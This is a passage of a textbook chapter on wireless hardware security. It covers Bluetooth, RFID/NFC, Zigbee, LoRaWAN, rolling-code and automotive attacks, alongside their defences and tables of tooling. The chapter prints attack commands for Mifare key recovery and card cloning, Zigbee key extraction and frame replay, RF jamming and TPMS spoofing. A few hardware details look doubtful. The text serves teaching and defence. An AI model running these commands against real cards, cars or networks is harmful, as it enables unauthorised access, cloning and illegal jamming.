+<p><strong>KRACK</strong> (Key Reinstallation Attack, Mathy Vanhoef, CCS 2017): 4-way handshake key reinstallation; if the PTK (Pairwise Transient Key) is reinstalled with a replayed ANonce, the nonce counter resets, enabling TKIP keystream recovery or GTK reinstallation for multicast frames. Patched by mandatory PTK/GTK replay counter tracking in 2017.</p>
+<h2 id="sec-bluetooth-hw"><span class="secnum">36.4</span> Bluetooth Hardware Security<a class="headerlink" href="#sec-bluetooth-hw" title="Permanent link">&para;</a></h2>
+<h3 id="3641-bluetooth-hardware-chipsets"><span class="secnum">36.4.1</span> Bluetooth Hardware Chipsets<a class="headerlink" href="#3641-bluetooth-hardware-chipsets" title="Permanent link">&para;</a></h3>
+<p><strong>Nordic nRF52840</strong>: ARM Cortex-M4F at 64 MHz, 1 MB flash, 256 KB RAM, Bluetooth 5.3 LE + Bluetooth Classic, IEEE 802.15.4 (Thread/Zigbee), NFC-A, USB 2.0 FS, hardware AES-128 ECB/CCM accelerator, ARM CryptoCell-310 for ECC, SHA-256, TRNG. QFN-73 package, 7 mm <span class="arithmatex">\(\times\)</span> 7 mm.</p>
+<p><strong>TI CC2564B</strong>: dual-mode Bluetooth 4.1 Classic + LE, dedicated DSP for baseband processing, ARM Cortex-M0 host interface, integrated PA (+10 dBm), I2C / SPI / UART HCI interface, 2.4 GHz RF, 40 nm LP-CMOS.</p>
+<p><strong>Qualcomm QCA6174A</strong>: Wi-Fi 5 (802.11ac) + Bluetooth 5.0 combo SoC, 2<span class="arithmatex">\(\times\)</span>2 MIMO, MCS0–9, WPA3-SAE support via firmware update, M.2 form factor, used in Lenovo ThinkPad X1 Carbon, Dell XPS 13.</p>
+<h3 id="3642-knob-attack-cve-2019-9506"><span class="secnum">36.4.2</span> KNOB Attack – CVE-2019-9506<a class="headerlink" href="#3642-knob-attack-cve-2019-9506" title="Permanent link">&para;</a></h3>
+<p>KNOB (Key Negotiation Of Bluetooth, Antonioli et al., USENIX 2019): Bluetooth BR/EDR (Classic) negotiates entropy during the LMP (Link Manager Protocol) Feature Request. The specification allows entropy as low as 1 byte (8 bits). An attacker manipulating the entropy negotiation can force both devices to use 1-byte keys, brute-forceable in <span class="arithmatex">\(\leq 2^8 = 256\)</span> attempts.</p>
+<p>No pairing required – the attacker acts as a MitM between two already-paired devices. Affects all Bluetooth Classic devices before the November 2019 patch cycle.</p>
+<div class="language-text highlight"><pre><span></span><code># KNOB attack conceptual (requires Bluetooth patched firmware)
+# LMP Entropy Request message (before authentication):
+# HCI command: HCI_Set_Encryption_Key_Size (Bluetooth 4.x -&gt; removed in 5.0+)
+# Attacker intercepts LMP_max_encryption_key_size_req and replaces with:
+# MAX_KEY_SIZE = 1 (minimum allowed by spec: Bluetooth Core Spec 4.2 vol 2, E, 3.2)
+# Both peers accept (spec-compliant) and use 1-byte session key
+# Brute force: 256 keys exhausted in milliseconds using standard BT stack
+</code></pre></div>
+<h3 id="3643-bias-attack-cve-2020-10135"><span class="secnum">36.4.3</span> BIAS Attack – CVE-2020-10135<a class="headerlink" href="#3643-bias-attack-cve-2020-10135" title="Permanent link">&para;</a></h3>
+<p>BIAS (Bluetooth Impersonation AttackS, Antonioli et al., IEEE S&amp;P 2020): Bluetooth BR/EDR LEGACY (pre-Secure Simple Pairing) authentication is asymmetric: if one device does not support Secure Connections, the legacy authenticator is used. An attacker who knows a victim device’s Bluetooth MAC address can impersonate the victim’s paired master device by:</p>
+<ol>
+<li>
+<p>Initiating a connection to the victim as the known MAC</p>
+</li>
+<li>
+<p>Proposing LEGACY authentication (downgrade from SC)</p>
+</li>
+<li>
+<p>Responding to the authentication challenge without knowing the LTK (Long-Term Key) by exploiting an authentication protocol flaw in legacy mode</p>
+</li>
+</ol>
+<p>Result: authenticated session without knowledge of the LTK. Fixed by requiring bidirectional Secure Connections authentication when both devices support it (no downgrade allowed).</p>
+<h3 id="3644-bleedingbit-cve-2018-16986-cve-2018-7080"><span class="secnum">36.4.4</span> BLEEDINGBIT – CVE-2018-16986 / CVE-2018-7080<a class="headerlink" href="#3644-bleedingbit-cve-2018-16986-cve-2018-7080" title="Permanent link">&para;</a></h3>
+<p>BLEEDINGBIT (Armis, 2018): two vulnerabilities in TI BLE chipsets (CC2640, CC2650, CC2540, CC2541) used in enterprise Cisco, Meraki, and Aruba access points.</p>
+<p>CVE-2018-16986: a heap overflow triggered by parsing BLE advertisement packets with over-length data in the BTLE header. A crafted advertisement causes RCE on the TI CC26xx BLE stack firmware.</p>
+<p>CVE-2018-7080: an over-the-air update mechanism (“Over-The-Air Download”, OAD) in some AP firmware uses a default password (“ATI-crack-small” in some deployments) and lacks firmware signature verification, allowing arbitrary firmware update.</p>
+<h2 id="sec-rfid-nfc"><span class="secnum">36.5</span> RFID and NFC Security<a class="headerlink" href="#sec-rfid-nfc" title="Permanent link">&para;</a></h2>
+<h3 id="3651-mifare-classic-attack"><span class="secnum">36.5.1</span> Mifare Classic Attack<a class="headerlink" href="#3651-mifare-classic-attack" title="Permanent link">&para;</a></h3>
+<p>Mifare Classic (NXP, 13.56 MHz, ISO 14443-A): 48-bit proprietary CRYPTO1 stream cipher. CRYPTO1 vulnerabilities:</p>
+<ul>
+<li>
+<p><strong>Algebraic attack</strong> (Garcia et al., 2008): CRYPTO1 LFSR structure fully reverse-engineered; 48-bit key space exhaustible in seconds on modern hardware.</p>
+</li>
+<li>
+<p><strong>Dark-side attack</strong>: partial nonce recovery from error responses.</p>
+</li>
+<li>
+<p><strong>Nested attack</strong>: once one sector key is known, derive remaining keys from PRNG state (PRNG is tag-serial-number seeded, fully predictable).</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code># MFOC (Mifare Classic Offline Cracker) -- recover all sector keys
+$ mfoc -O dump.mfd       # recover all 16 sector keys, dump card memory
+
+# libnfc + mfcuk (PRNG-based dark-side attack)
+$ mfcuk -C -R 0:A -s 250 -S 250 -v 3   # recover sector 0 key A
+
+# Proxmark3 -- Swiss army knife for RFID
+$ pm3&gt; hf mf autopwn     # fully automated Mifare Classic attack
+$ pm3&gt; hf mf dump        # dump card contents to file
+$ pm3&gt; hf mf restore     # restore dump to blank card (card cloning)
+</code></pre></div>
+<h3 id="3652-nfc-relay-attack"><span class="secnum">36.5.2</span> NFC Relay Attack<a class="headerlink" href="#3652-nfc-relay-attack" title="Permanent link">&para;</a></h3>
+<p>NFC relay attack (“ghost-and-leech”): two devices bridge a reader-to-card NFC session over a long-range channel (Bluetooth, WiFi, internet). Ghost device (near reader): emulates the victim card. Leech device (near victim card): queries the victim card. Maximum NFC range: 10–20 cm (ISO 14443); relay effectively extends this to kilometres.</p>
+<div class="language-text highlight"><pre><span></span><code># NFCGate relay (University of Darmstadt, open source)
+# Server: bridges ghost &lt;-&gt; leech over TCP
+# Ghost (near reader): forwards reader APDU commands to server
+# Leech (near card): sends commands to victim card, relays response
+# Android app + server-side relay; latency typically 50--200 ms
+# Detection: timing-based (ISO 14443-3: FWT = Frame Waiting Time, max 4949 ms)
+</code></pre></div>
+<p>Defence: UWB (Ultra-Wideband) ranging for payment cards (Mastercard/Visa UWB proposal 2023): range measurement accurate to <span class="arithmatex">\(\pm 10\)</span> cm; relay adds <span class="arithmatex">\(\geq 1\)</span> ms latency, detectable as anomalous range versus timing correlation.</p>
+<h2 id="sec-zigbee"><span class="secnum">36.6</span> Zigbee and IEEE 802.15.4 Security<a class="headerlink" href="#sec-zigbee" title="Permanent link">&para;</a></h2>
+<p>Zigbee (IEEE 802.15.4 PHY, Zigbee Alliance NWK/APS): 2.4 GHz band (16 channels, 5 MHz spacing), O-QPSK modulation, 250 kbps, AES-128-CCM* for link-layer encryption, network key shared across all mesh nodes.</p>
+<p>KillerBee framework (River Loop Security): Python framework for IEEE 802.15.4 attacks. Hardware: RZUSBSTICK (Atmel AT86RF230), ApiMote, Sewio RTLS.</p>
+<div class="language-text highlight"><pre><span></span><code># KillerBee Zigbee network key extraction
+# Step 1: Sniff channel for unencrypted NWK Key transport
+$ zbdump -f capture.pcap -c 15 -d /dev/ttyUSB0   # sniff channel 15
+
+# Step 2: Find network key in a join frame (if network allows insecure join)
+$ zbwireshark -f capture.pcap | grep "NWK Key"
+
+# Step 3: Decrypt all traffic with recovered network key
+$ zbdecrypt -f capture.pcap -k 1234567890abcdef1234567890abcdef -w decrypted.pcap
+
+# Step 4: Replay attack (inject a captured command frame)
+$ zbreplay -f attack_frame.pcap -c 15 -d /dev/ttyUSB0 -n 3
+</code></pre></div>
+<h2 id="sec-lorawan"><span class="secnum">36.7</span> LoRa and LoRaWAN Security<a class="headerlink" href="#sec-lorawan" title="Permanent link">&para;</a></h2>
+<p>LoRaWAN (LoRa Alliance, TS001 v1.1, 2020): long-range IoT protocol using CSS (Chirp Spread Spectrum) modulation, 863–928 MHz (region-dependent), range up to 15 km.</p>
+<p>LoRaWAN v1.1 security keys:</p>
+<ul>
+<li>
+<p>NwkKey (128-bit): root network key for OTAA (Over-The-Air Activation)</p>
+</li>
+<li>
+<p>AppKey (128-bit): root application key for OTAA</p>
+</li>
+<li>
+<p>NwkSKey (128-bit): network session key (derived during OTAA join)</p>
+</li>
+<li>
+<p>AppSKey (128-bit): application session key</p>
+</li>
+<li>
+<p>FCntDown (16-bit): downlink frame counter</p>
+</li>
+</ul>
+<p><strong>LoRaWAN replay vulnerability</strong> (v1.0 and some v1.1 deployments): If FCntDown validation is disabled or the counter wraps, old downlink frames can be replayed. In v1.0, FCntDown was 16-bit and wrap-around after 65,535 frames could be exploited on long-running deployments. LoRaWAN v1.1 uses a 32-bit counter and mandates validation.</p>
+<div class="language-text highlight"><pre><span></span><code># LoRaWAN packet decode using GNU Radio + gr-lora
+# Decode a captured LoRa frame (Wireshark + LoRa dissector)
+# Chirpstack server-side: verify FCnt
+$ chirpstack-api applications list | jq '.applications[] | .id'
+$ curl -s "http://localhost:8080/api/devices/{devEUI}/frames" \
+       -H "Grpc-Metadata-Authorization: Bearer $TOKEN"
+# Check: each frame FCnt must strictly increase; reject if FCnt &lt;= last_seen
+</code></pre></div>
+<h2 id="sec-rolljam"><span class="secnum">36.8</span> Rolling Code Security – RollJam Attack<a class="headerlink" href="#sec-rolljam" title="Permanent link">&para;</a></h2>
+<p>RollJam (Samy Kamkar, DEF CON 23, 2015): defeats rolling code (KeeLoq, AUT64) keyless entry systems used in car remotes and garage doors.</p>
+<p>Protocol: each button press transmits a new pseudo-random code (KeeLoq HOTP). The receiver accepts the next <span class="arithmatex">\(N\)</span> valid codes in the rolling window (typically <span class="arithmatex">\(N = 3\)</span>).</p>
+<p>RollJam attack:</p>
+<ol>
+<li>
+<p>Jam the 315 MHz / 433 MHz channel (barrage jammer, +30 dBm on-band) while simultaneously receiving and storing the victim’s first code <span class="arithmatex">\(C_1\)</span>.</p>
+</li>
+<li>
+<p>Victim presses button again (car didn’t unlock); jam while receiving <span class="arithmatex">\(C_2\)</span>.</p>
+</li>
+<li>
+<p>Release jammer: replay <span class="arithmatex">\(C_1\)</span>. Car unlocks. Attacker retains unused <span class="arithmatex">\(C_2\)</span>.</p>
+</li>
+<li>
+<p>At a later time: replay <span class="arithmatex">\(C_2\)</span> (still valid, not yet used by car).</p>
+</li>
+<li>
+<p>Car unlocks without victim’s knowledge.</p>
+</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code># RollJam hardware: HackRF One (receiver) + amplifier (jammer)
+# GNU Radio flowgraph: FM demod at 433.92 MHz, ASK/OOK decoder
+
+# Detect rolling code capture: OOK decoder (On-Off Keying)
+$ hackrf_transfer -r capture.raw -f 433920000 -s 2000000
+$ python3 ook_decode.py capture.raw --rate 2000000 --freq 433920000
+
+# Jam simultaneously (requires second radio or switched TX/RX)
+$ hackrf_transfer -t /dev/urandom -f 433920000 -s 2000000 -x 47
+# NOTE: jamming is illegal without authorisation; research in RF-shielded enclosure only
+
+# Defence: Ultra-Wideband (UWB) ranging (Apple CarKey, BMW Digital Key 3.0)
+# UWB CIR (Channel Impulse Response) provides 10 cm positioning accuracy
+# Cannot be replayed -- requires physical proximity (&lt; 5 m)
+</code></pre></div>
+<h2 id="sec-automotive-wireless"><span class="secnum">36.9</span> Automotive Wireless Security<a class="headerlink" href="#sec-automotive-wireless" title="Permanent link">&para;</a></h2>
+<h3 id="3691-tpms-spoofing"><span class="secnum">36.9.1</span> TPMS Spoofing<a class="headerlink" href="#3691-tpms-spoofing" title="Permanent link">&para;</a></h3>
+<p>Tyre Pressure Monitoring Systems (TPMS, mandatory in US since 2008): 315 MHz or 433.92 MHz FSK/ASK transmission, each sensor broadcasts pressure, temperature, and sensor ID (typically 32-bit fixed ID) every 60–90 seconds.</p>
+<p>Spoofing: transmit a crafted TPMS frame with low-pressure value for any valid sensor ID. The dashboard warning activates. Attack requires capturing a valid sensor ID (passive eavesdrop) or bruteforcing the 32-bit ID space.</p>
+<div class="language-text highlight"><pre><span></span><code># TPMS capture using RTL-SDR + rtl_433
+$ rtl_433 -f 315M -R 33 -F json       # decode Ford TPMS protocol
+# Output: {"model":"Ford","id":12345678,"pressure_kPa":241.3,"temperature_C":25}
+
+# TPMS spoof (research/authorised testing only, RF-shielded enclosure)
+$ hackrf_transfer -t tpms_low_pressure.raw -f 315000000 -s 2000000 -x 40
+</code></pre></div>
+<h3 id="3692-keyless-entry-relay-attack"><span class="secnum">36.9.2</span> Keyless Entry Relay Attack<a class="headerlink" href="#3692-keyless-entry-relay-attack" title="Permanent link">&para;</a></h3>
+<p>Passive Keyless Entry (PKE): 125 kHz LF challenge from car + 315/433 MHz UHF response from fob. LF range: <span class="arithmatex">\(\leq 1\)</span> m. Attack: relay LF challenge to fob location (using amplified LF transmitter), relay UHF response back to car. Commercial relay kits available (<span class="arithmatex">\(&lt; \$100\)</span>); relay attack range: up to 100 m.</p>
+<h3 id="3693-uwb-ranging-apple-carkey"><span class="secnum">36.9.3</span> UWB Ranging (Apple CarKey)<a class="headerlink" href="#3693-uwb-ranging-apple-carkey" title="Permanent link">&para;</a></h3>
+<p>Apple CarKey (iPhone 11+, U1 chip, 2020): uses IEEE 802.15.4a Ultra-Wideband for precise ranging (Channel 9, 7.9872 GHz, BPRF mode, 499.2 MHz bandwidth). Time-of-Flight (ToF) measurement: <span class="arithmatex">\(d = c \cdot \Delta t / 2\)</span>, resolution <span class="arithmatex">\(\pm 10\)</span> cm. A relay attack adds <span class="arithmatex">\(&gt; 3\)</span> ns propagation delay (<span class="arithmatex">\(3~\text{ns} \times c = 90\)</span> cm offset); the CCC Digital Key 3.0 specification rejects range measurements with unexpected delay. BMW, Mercedes, and Hyundai deploy CCC Digital Key 3.0 with UWB ranging as of 2022.</p>
+<h2 id="sec-spectrum-monitoring"><span class="secnum">36.10</span> Spectrum Monitoring Hardware<a class="headerlink" href="#sec-spectrum-monitoring" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-spectrum-hw">
+<div class="tbl-caption"><strong>Table 36.2.</strong> Spectrum monitoring hardware for wireless security operations.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Platform</strong></th>
+<th style="text-align: left;"><strong>Vendor</strong></th>
+<th style="text-align: left;"><strong>Range</strong></th>
+<th style="text-align: left;"><strong>SFDR (dBc)</strong></th>
+<th style="text-align: left;"><strong>Interface</strong></th>
+<th style="text-align: left;"><strong>Use Case</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">N9030B PSA</td>
+<td style="text-align: left;">Keysight</td>
+<td style="text-align: left;">3 Hz–50 GHz</td>
+<td style="text-align: left;">73</td>
+<td style="text-align: left;">GPIB / USB</td>
+<td style="text-align: left;">Lab reference</td>
+</tr>
+<tr>
+<td style="text-align: left;">FSW-43</td>
+<td style="text-align: left;">Rohde&amp;Schwarz</td>
+<td style="text-align: left;">2 Hz–43 GHz</td>
+<td style="text-align: left;">70</td>
+<td style="text-align: left;">LAN / USB</td>
+<td style="text-align: left;">Field measurement</td>
+</tr>
+<tr>
+<td style="text-align: left;">RFeye Node 100-18</td>
+<td style="text-align: left;">CRFS</td>
+<td style="text-align: left;">100 MHz–18 GHz</td>
+<td style="text-align: left;">65</td>
+<td style="text-align: left;">GbE</td>
+<td style="text-align: left;">Fixed site monitor</td>
+</tr>
+<tr>
+<td style="text-align: left;">Signal Hound BB60D</td>
+<td style="text-align: left;">Signal Hound</td>
+<td style="text-align: left;">9 kHz–6 GHz</td>
+<td style="text-align: left;">70</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">Portable RF survey</td>
+</tr>
+<tr>
+<td style="text-align: left;">Nuand bladeRF 2.0</td>
+<td style="text-align: left;">Nuand</td>
+<td style="text-align: left;">47 MHz–6 GHz</td>
+<td style="text-align: left;">62</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">SDR wideband</td>
+</tr>
+<tr>
+<td style="text-align: left;">Tektronix RSA507A</td>
+<td style="text-align: left;">Tektronix</td>
+<td style="text-align: left;">9 kHz–7.5 GHz</td>
+<td style="text-align: left;">68</td>
+<td style="text-align: left;">USB 3.0</td>
+<td style="text-align: left;">DPX real-time</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<p>Universal Radio Hacker (URH, GitHub: jopohl/urh): open-source GUI for protocol reverse engineering. Supports RTL-SDR, HackRF, LimeSDR, USRP via GNU Radio backends. Features: signal demodulation (OOK, FSK, PSK, APSK), bit pattern analysis, fuzzing, and protocol simulation.</p>
+<div class="language-text highlight"><pre><span></span><code># URH command-line interface
+$ urh        # launch GUI
+$ urh-cli --device HackRF --frequency 433920000 \
+           --sample-rate 2000000 --capture output.complex
+# Automated protocol analysis
+$ urh-cli --analyze output.complex --modulation FSK --bandwidth 50000
+</code></pre></div>
+<h2 id="sec-gnuradio"><span class="secnum">36.11</span> GNU Radio Protocol Decoding<a class="headerlink" href="#sec-gnuradio" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code>#!/usr/bin/env python3
+# GNU Radio: 433 MHz IoT sensor OOK decoder
+from gnuradio import gr, blocks, analog, digital, filter
+from gnuradio.filter import firdes
+
+class IoT433Receiver(gr.top_block):
+    def __init__(self, freq=433.92e6, samp_rate=2e6):
+        super().__init__("IoT 433 MHz Receiver")
+
+        # RTL-SDR source
+        from osmosdr import source as osmosdr_src
+        self.src = osmosdr_src(args="rtl=0")
+        self.src.set_center_freq(freq)
+        self.src.set_sample_rate(samp_rate)
+        self.src.set_gain(40)
+
+        # Low-pass filter (anti-alias, cutoff 100 kHz)
+        self.lpf = filter.fir_filter_ccf(
+            1, firdes.low_pass(1, samp_rate, 100e3, 10e3))
+
+        # AM demod -&gt; envelope detector
+        self.mag = blocks.complex_to_mag()
+
+        # Binary slicer (threshold = 0.01)
+        self.slicer = digital.binary_slicer_fb()
+
+        # Manchester decoder -&gt; file sink
+        self.sink = blocks.file_sink(gr.sizeof_char, "/tmp/ook_bits.bin")
+
+        self.connect(self.src, self.lpf, self.mag, self.slicer, self.sink)
+
+if __name__ == "__main__":
+    tb = IoT433Receiver()
+    tb.start()
+    input("Press Enter to stop...\n")
+    tb.stop()
+</code></pre></div>
+<h2 id="sec-wireless-fpga"><span class="secnum">36.12</span> FPGA Implementation for Wireless Security<a class="headerlink" href="#sec-wireless-fpga" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-wireless-fpga">
+<div class="tbl-caption"><strong>Table 36.3.</strong> FPGA implementation for wireless security monitoring.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Device</strong></th>
+<th style="text-align: right;"><strong>LUTs</strong></th>
+<th style="text-align: right;"><strong>FFs</strong></th>
+<th style="text-align: right;"><strong>BRAMs</strong></th>
+<th style="text-align: right;"><strong>DSPs</strong></th>
+<th style="text-align: right;"><strong>Fmax (MHz)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Xilinx Artix-7 XC7A35T (802.15.4 sniffer)</td>
+<td style="text-align: right;">8,200</td>
+<td style="text-align: right;">9,400</td>
+<td style="text-align: right;">18</td>
+<td style="text-align: right;">16</td>
+<td style="text-align: right;">125</td>
+<td style="text-align: right;">380</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx ZU9EG (Wi-Fi 6 protocol IDS)</td>
+<td style="text-align: right;">82,000</td>
+<td style="text-align: right;">94,000</td>
+<td style="text-align: right;">256</td>
+<td style="text-align: right;">512</td>
+<td style="text-align: right;">300</td>
+<td style="text-align: right;">8,200</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Cyclone V GX (BLE monitor)</td>
+<td style="text-align: right;">11,400</td>
+<td style="text-align: right;">13,200</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">8</td>
+<td style="text-align: right;">100</td>
+<td style="text-align: right;">520</td>
+</tr>
+<tr>
+<td style="text-align: left;">Intel Agilex F (multi-band SDR IDS)</td>
+<td style="text-align: right;">44,000</td>
+<td style="text-align: right;">52,000</td>
+<td style="text-align: right;">128</td>
+<td style="text-align: right;">256</td>
+<td style="text-align: right;">450</td>
+<td style="text-align: right;">6,400</td>
+</tr>
+<tr>
+<td style="text-align: left;">Lattice ECP5-85F (TPMS decoder)</td>
+<td style="text-align: right;">6,800</td>
+<td style="text-align: right;">7,600</td>
+<td style="text-align: right;">16</td>
+<td style="text-align: right;">0</td>
+<td style="text-align: right;">80</td>
+<td style="text-align: right;">290</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx KU15P (wideband spectrum mon.)</td>
+<td style="text-align: right;">120,000</td>
+<td style="text-align: right;">142,000</td>
+<td style="text-align: right;">384</td>
+<td style="text-align: right;">768</td>
+<td style="text-align: right;">400</td>
+<td style="text-align: right;">15,000</td>
+</tr>
+<tr>
+<td style="text-align: left;">Xilinx Artix-7 XC7A200T (DSSS correlator)</td>
+<td style="text-align: right;">28,400</td>
+<td style="text-align: right;">32,000</td>
+<td style="text-align: right;">64</td>
+<td style="text-align: right;">128</td>
+<td style="text-align: right;">200</td>
+<td style="text-align: right;">2,100</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-wireless-asic"><span class="secnum">36.13</span> ASIC Implementation<a class="headerlink" href="#sec-wireless-asic" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-wireless-asic">
+<div class="tbl-caption"><strong>Table 36.4.</strong> Wireless security ASIC implementation results.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Process</strong></th>
+<th style="text-align: left;"><strong>Function</strong></th>
+<th style="text-align: right;"><strong>Area (mm<span class="math inline">\(^2\)</span>)</strong></th>
+<th style="text-align: right;"><strong>Power (mW)</strong></th>
+<th style="text-align: right;"><strong>Freq (MHz)</strong></th>
+<th style="text-align: right;"><strong>ECC</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">TSMC 28nm CMOS</td>
+<td style="text-align: left;">BCM4389 Wi-Fi 6E SoC</td>
+<td style="text-align: right;">42.0</td>
+<td style="text-align: right;">1200</td>
+<td style="text-align: right;">2000</td>
+<td style="text-align: right;">WPA3 GCM-256</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 28nm LP</td>
+<td style="text-align: left;">nRF52840 BLE + 802.15.4</td>
+<td style="text-align: right;">10.0</td>
+<td style="text-align: right;">4</td>
+<td style="text-align: right;">64</td>
+<td style="text-align: right;">AES-128 CCM*</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 40nm LP</td>
+<td style="text-align: left;">TI CC2640 BLE SoC</td>
+<td style="text-align: right;">6.5</td>
+<td style="text-align: right;">6</td>
+<td style="text-align: right;">48</td>
+<td style="text-align: right;">AES-128 CCM*</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 22nm FDX</td>
+<td style="text-align: left;">UWB CCC DK3.0 SoC</td>
+<td style="text-align: right;">5.2</td>
+<td style="text-align: right;">38</td>
+<td style="text-align: right;">500</td>
+<td style="text-align: right;">AES-128 GCM</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 16nm FF</td>
+<td style="text-align: left;">Intel AX210 Wi-Fi 6E</td>
+<td style="text-align: right;">58.0</td>
+<td style="text-align: right;">2800</td>
+<td style="text-align: right;">2400</td>
+<td style="text-align: right;">WPA3 SAE</td>
+</tr>
+<tr>
+<td style="text-align: left;">TSMC 28nm</td>
+<td style="text-align: left;">LoRa SX1276 SoC</td>
+<td style="text-align: right;">4.0</td>
+<td style="text-align: right;">10</td>
+<td style="text-align: right;">32</td>
+<td style="text-align: right;">AES-128 CTR</td>
+</tr>
+<tr>
+<td style="text-align: left;">Samsung 14nm</td>
+<td style="text-align: left;">Qualcomm FastConnect 6900</td>
+<td style="text-align: right;">78.0</td>
+<td style="text-align: right;">3200</td>
+<td style="text-align: right;">2500</td>
+<td style="text-align: right;">WPA3 GCMP-256</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h2 id="sec-wireless-solutions"><span class="secnum">36.14</span> Commercial and Open-Source Solutions<a class="headerlink" href="#sec-wireless-solutions" title="Permanent link">&para;</a></h2>
+<div class="tbl" id="tab-wireless-all-solutions">
+<div class="tbl-caption"><strong>Table 36.5.</strong> Wireless hardware security solutions – all categories.</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Product / Tool</strong></th>
+<th style="text-align: left;"><strong>Vendor</strong></th>
+<th style="text-align: left;"><strong>Type</strong></th>
+<th style="text-align: left;"><strong>Notes</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Kismet WIDS</td>
+<td style="text-align: left;">Mike Kershaw</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Wi-Fi / BT / Zigbee IDS</td>
+</tr>
+<tr>
+<td style="text-align: left;">Wireshark + TShark</td>
+<td style="text-align: left;">Wireshark.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Protocol analyser, 802.11 decryption</td>
+</tr>
+<tr>
+<td style="text-align: left;">Aircrack-ng suite</td>
+<td style="text-align: left;">aircrack-ng.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">WPA2/WPA3 pentest: airodump, aireplay</td>
+</tr>
+<tr>
+<td style="text-align: left;">hcxdumptool + hashcat</td>
+<td style="text-align: left;">ZerBea + hashcat.net</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">PMKID capture + GPU WPA2 cracking</td>
+</tr>
+<tr>
+<td style="text-align: left;">Universal Radio Hacker</td>
+<td style="text-align: left;">jopohl.de</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">IoT protocol reverse engineering</td>
+</tr>
+<tr>
+<td style="text-align: left;">GNU Radio</td>
+<td style="text-align: left;">gnuradio.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">SDR signal processing framework</td>
+</tr>
+<tr>
+<td style="text-align: left;">gr-lora</td>
+<td style="text-align: left;">BastilleRes.</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">GNU Radio LoRa/LoRaWAN decoder</td>
+</tr>
+<tr>
+<td style="text-align: left;">gr-ieee802154</td>
+<td style="text-align: left;">GNU Radio</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">IEEE 802.15.4 Zigbee GNU Radio block</td>
+</tr>
+<tr>
+<td style="text-align: left;">KillerBee</td>
+<td style="text-align: left;">River Loop</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">IEEE 802.15.4 Zigbee attack toolkit</td>
+</tr>
+<tr>
+<td style="text-align: left;">Proxmark3 (RDV4)</td>
+<td style="text-align: left;">Proxmark.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">RFID/NFC attack platform, CRYPTO1</td>
+</tr>
+<tr>
+<td style="text-align: left;">NFCGate</td>
+<td style="text-align: left;">TU Darmstadt</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Android NFC relay tool</td>
+</tr>
+<tr>
+<td style="text-align: left;">libnfc + MFOC</td>
+<td style="text-align: left;">nfc-tools.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Mifare Classic key recovery</td>
+</tr>
+<tr>
+<td style="text-align: left;">Scapy</td>
+<td style="text-align: left;">secdev.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Packet craft: 802.11, BLE, ZigBee</td>
+</tr>
+<tr>
+<td style="text-align: left;">Bettercap</td>
+<td style="text-align: left;">bettercap.org</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">Network/WiFi/BLE MitM, caplets</td>
+</tr>
+<tr>
+<td style="text-align: left;">rtl_433</td>
+<td style="text-align: left;">merbanan.github</td>
+<td style="text-align: left;">Open-source</td>
+<td style="text-align: left;">433/868 MHz IoT protocol decoder</td>
+</tr>
+<tr>
+<td style="text-align: left;">RTL-SDR v3</td>
+<td style="text-align: left;">rtl-sdr.com</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">DVB-T dongle as SDR, R820T2 tuner</td>
+</tr>
+<tr>
+<td style="text-align: left;">HackRF One</td>
+<td style="text-align: left;">Great Scott Gadgets</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">1–6 GHz TX/RX SDR, 20 MHz BW</td>
+</tr>
+<tr>
+<td style="text-align: left;">LimeSDR Mini 2.0</td>
+<td style="text-align: left;">Lime Microsystems</td>
+<td style="text-align: left;">Commercial</td>
+<td style="text-align: left;">10–3500 MHz, 12-bit ADC, USB 3</td>
+</tr>
+<tr>
+<td style="text-align: left;">USRP N210</td>
